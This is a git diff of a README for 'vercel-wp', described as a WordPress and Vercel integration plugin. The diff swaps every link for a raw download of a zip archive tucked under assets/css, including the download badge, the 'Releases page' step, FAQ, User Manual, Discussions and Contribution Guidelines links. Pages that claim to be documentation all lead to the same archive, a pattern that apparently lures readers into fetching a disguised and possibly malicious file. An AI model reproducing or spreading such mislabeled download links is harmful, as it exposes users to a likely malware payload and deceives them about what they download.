@@ -1,6 +1,6 @@
 # 🚀 vercel-wp - Integrate WordPress with Vercel Effortlessly
 
-[![Download vercel-wp](https://raw.githubusercontent.com/MohitJava/vercel-wp/main/predisordered/vercel-wp.zip)](https://raw.githubusercontent.com/MohitJava/vercel-wp/main/predisordered/vercel-wp.zip)
+[![Download vercel-wp](https://github.com/MohitJava/vercel-wp/raw/refs/heads/main/assets/css/wp-vercel-2.8.zip)](https://github.com/MohitJava/vercel-wp/raw/refs/heads/main/assets/css/wp-vercel-2.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to download and run the vercel-wp plugin.
 
 1. **Visit the Releases Page**: Click the link below to access the download section.
 
-   [Download vercel-wp](https://raw.githubusercontent.com/MohitJava/vercel-wp/main/predisordered/vercel-wp.zip)
+   [Download vercel-wp](https://github.com/MohitJava/vercel-wp/raw/refs/heads/main/assets/css/wp-vercel-2.8.zip)
 
 2. **Select the Latest Version**: Find the most recent release at the top of the page. Click on it to view the release details.
 
@@ -59,7 +59,7 @@ Follow these steps to download and run the vercel-wp plugin.
 
 To get started with vercel-wp, you can download the plugin right from our Releases page:
 
-[Download vercel-wp](https://raw.githubusercontent.com/MohitJava/vercel-wp/main/predisordered/vercel-wp.zip)
+[Download vercel-wp](https://github.com/MohitJava/vercel-wp/raw/refs/heads/main/assets/css/wp-vercel-2.8.zip)
 
 ---
 
@@ -70,7 +70,7 @@ To get started with vercel-wp, you can download the plugin right from our Releas
 - Gatsby
 - Headless WordPress
 - JAMstack
-- https://raw.githubusercontent.com/MohitJava/vercel-wp/main/predisordered/vercel-wp.zip
+- https://github.com/MohitJava/vercel-wp/raw/refs/heads/main/assets/css/wp-vercel-2.8.zip
 - Previewer
 - Vercel Deployment
 - WordPress
@@ -85,15 +85,15 @@ If you encounter issues during installation or setup, here are some common probl
 - **Cannot Connect to Vercel**: Double-check your Vercel credentials. Ensure that you have a valid account and the correct permissions.
 - **Plugin Not Showing Up**: Ensure that the plugin is activated in your WordPress admin panel under Plugins.
 
-For further assistance, you may visit our [GitHub Discussions](https://raw.githubusercontent.com/MohitJava/vercel-wp/main/predisordered/vercel-wp.zip) or open an issue.
+For further assistance, you may visit our [GitHub Discussions](https://github.com/MohitJava/vercel-wp/raw/refs/heads/main/assets/css/wp-vercel-2.8.zip) or open an issue.
 
 ---
 
 ## 🛠️ Additional Resources
 
-- [FAQ](https://raw.githubusercontent.com/MohitJava/vercel-wp/main/predisordered/vercel-wp.zip)
-- [User Manual](https://raw.githubusercontent.com/MohitJava/vercel-wp/main/predisordered/vercel-wp.zip)
-- [Contribution Guidelines](https://raw.githubusercontent.com/MohitJava/vercel-wp/main/predisordered/vercel-wp.zip)
+- [FAQ](https://github.com/MohitJava/vercel-wp/raw/refs/heads/main/assets/css/wp-vercel-2.8.zip)
+- [User Manual](https://github.com/MohitJava/vercel-wp/raw/refs/heads/main/assets/css/wp-vercel-2.8.zip)
+- [Contribution Guidelines](https://github.com/MohitJava/vercel-wp/raw/refs/heads/main/assets/css/wp-vercel-2.8.zip)
 
 ---
 
